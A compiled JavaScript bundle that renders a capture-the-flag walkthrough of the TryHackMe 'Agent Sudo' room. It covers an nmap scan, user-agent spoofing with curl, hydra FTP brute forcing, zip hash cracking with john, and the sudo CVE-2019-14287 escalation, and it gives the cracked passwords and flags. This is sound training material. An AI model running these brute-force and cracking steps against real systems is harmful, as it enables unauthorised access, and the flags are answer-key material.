"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2012],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),p=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},u=function(e){var t=p(e.components);return r.createElement(s.Provider,{value:t},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},k=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),c=p(n),k=a,h=c["".concat(s,".").concat(k)]||c[k]||d[k]||o;return n?r.createElement(h,l(l({ref:t},u),{},{components:n})):r.createElement(h,l({ref:t},u))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,l=new Array(o);l[0]=k;var i={};for(var s in t)hasOwnProperty.call(t,s)&&(i[s]=t[s]);i.originalType=e,i[c]="string"==typeof e?e:a,l[1]=i;for(var p=2;p<o;p++)l[p]=n[p];return r.createElement.apply(null,l)}return r.createElement.apply(null,n)}k.displayName="MDXCreateElement"},78799:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>l,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var r=n(87462),a=(n(67294),n(3905));const o={},l="Agent Sudo",i={unversionedId:"Tryhackme/Agent Sudo/Agent Sudo",id:"Tryhackme/Agent Sudo/Agent Sudo",title:"Agent Sudo",description:"You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.",source:"@site/writeups/Tryhackme/Agent Sudo/Agent Sudo.md",sourceDirName:"Tryhackme/Agent Sudo",slug:"/Tryhackme/Agent Sudo/",permalink:"/writeups/Tryhackme/Agent Sudo/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Adventure Time",permalink:"/writeups/Tryhackme/Adventure Time/"},next:{title:"Alfred",permalink:"/writeups/Tryhackme/Alfred/"}},s={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Author note",id:"author-note",level:2},{value:"Enumerate",id:"enumerate",level:2},{value:"Hash cracking and brute-force",id:"hash-cracking-and-brute-force",level:2},{value:"Capture the user flag",id:"capture-the-user-flag",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}],u={toc:p},c="wrapper";function d(e){let{components:t,...n}=e;return(0,a.kt)(c,(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"agent-sudo"},"Agent Sudo"),(0,a.kt)("p",null,"You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth."),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/agentsudoctf"},"Agent Sudo")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Header Manipulation"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (FTP)"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (Zip)"),(0,a.kt)("li",{parentName:"ul"},"Steganography"),(0,a.kt)("li",{parentName:"ul"},"Cryptography",(0,a.kt)("ul",{parentName:"li"},(0,a.kt)("li",{parentName:"ul"},"Base64"))),(0,a.kt)("li",{parentName:"ul"},"OSINT"),(0,a.kt)("li",{parentName:"ul"},"CVE-2019-14287 - Sudo < 1.8.28")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"author-note"},"Author note"),(0,a.kt)("p",null,"Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!"),(0,a.kt)("p",null,"If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Deploy the machine")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("h2",{id:"enumerate"},"Enumerate"),(0,a.kt)("p",null,"Enumerate the machine and get all the important information"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"How many open ports?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Agent Sudo$ sudo nmap -A -Pn -sC -sV -O 10.10.34.31\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 13:28 CEST\nNmap scan report for 10.10.34.31\nHost is up (0.053s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Annoucement\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/4%OT=21%CT=1%CU=35221%PV=Y%DS=2%DC=T%G=Y%TM=5F79B1F\nOS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)SEQ\nOS:(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%TS=A)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%II=I%\nOS:TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5\nOS:=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=\nOS:68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%\nOS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0\nOS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S\nOS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R\nOS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N\nOS:%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 554/tcp)\nHOP RTT      ADDRESS\n1   36.49 ms 10.8.0.1\n2   36.67 ms 10.10.34.31\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.71 seconds\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"3")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"How you redirect yourself to a secret page?")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"http://10.10.34.31/"},"http://10.10.34.31/"))),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Dear agents,\n\nUse your own codename as user-agent to access the site.\n\nFrom,\nAgent R\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"user-agent")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the agent name?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Agent Sudo$ curl -A "C" -L 10.10.34.31\nAttention chris, <br><br>\n\nDo you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>\n\nFrom,<br>\nAgent R\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"chris")),(0,a.kt)("h2",{id:"hash-cracking-and-brute-force"},"Hash cracking and brute-force"),(0,a.kt)("p",null,"Done enumerate the machine? Time to brute your way out."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"FTP password")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Agent Sudo$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.34.31 ftp\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 13:36:32\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ftp://10.10.34.31:21/\n[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344243 to do in 1532:31h, 16 active\n[21][ftp] host: 10.10.34.31   login: chris   password: crystal\n")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Zip file password")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Agent Sudo$ binwalk -e cutie.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced\n869           0x365           Zlib compressed data, best compression\n34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\n34820         0x8804          End of Zip archive, footer length: 22\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Agent Sudo$ zip2john _cutie.png.extracted/8702.zip > zip.hash\nver 81.9 _cutie.png.extracted/8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type\nkali@kali:~/CTFs/tryhackme/Agent Sudo$ john zip.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, almost any other key for status\nAlmost done: Processing the remaining buffered candidate passwords, if any.\nWarning: Only 7 candidates buffered for the current salt, minimum 16 needed for performance.\nProceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist\nalien            (8702.zip/To_agentR.txt)\n1g 0:00:00:01 DONE 2/3 (2020-10-04 13:42) 0.6993g/s 37134p/s 37134c/s 37134C/s 123456..Peter\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,a.kt)("ol",{start:3},(0,a.kt)("li",{parentName:"ol"},"steg password")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Agent Sudo$ echo -n 'QXJlYTUx' | base64 -d\nArea51\n")),(0,a.kt)("ol",{start:4},(0,a.kt)("li",{parentName:"ol"},"Who is the other agent (in full name)?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"james")),(0,a.kt)("ol",{start:5},(0,a.kt)("li",{parentName:"ol"},"SSH password")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Agent Sudo$ cat message.txt\nHi james,\n\nGlad you find this message. Your login password is hackerrules!\n\nDon't ask me why the password look cheesy, ask agent R who set this password for you.\n\nYour buddy,\nchris\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"hackerrules!")),(0,a.kt)("h2",{id:"capture-the-user-flag"},"Capture the user flag"),(0,a.kt)("p",null,"You know the drill."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"james@agent-sudo:~$ cat user_flag.txt\nb03d975e8c92a7c04146cfa7a5a313c7\n")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"What is the incident of the photo called?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Agent Sudo$ scp james@10.10.34.31:Alien_autospy.jpg ./\njames@10.10.34.31's password:\nAlien_autospy.jpg                                            100%   41KB 358.6KB/s   00:00\nkali@kali:~/CTFs/tryhackme/Agent Sudo$\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"roswell alien autopsy")),(0,a.kt)("h2",{id:"privilege-escalation"},"Privilege escalation"),(0,a.kt)("p",null,"Enough with the extraordinary stuff? Time to get real."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"CVE number for the escalation (Format: CVE-xxxx-xxxx)")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"CVE-2019-14287")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"root@agent-sudo:/root# cat root.txt\nTo Mr.hacker,\n\nCongratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.\n\nYour flag is\nb53a02f55b57d4439e3341834d70c062\n\nBy,\nDesKel a.k.a Agent R\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"b53a02f55b57d4439e3341834d70c062")),(0,a.kt)("ol",{start:3},(0,a.kt)("li",{parentName:"ol"},"(Bonus) Who is Agent R?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"DesKel")))}d.isMDXComponent=!0}}]);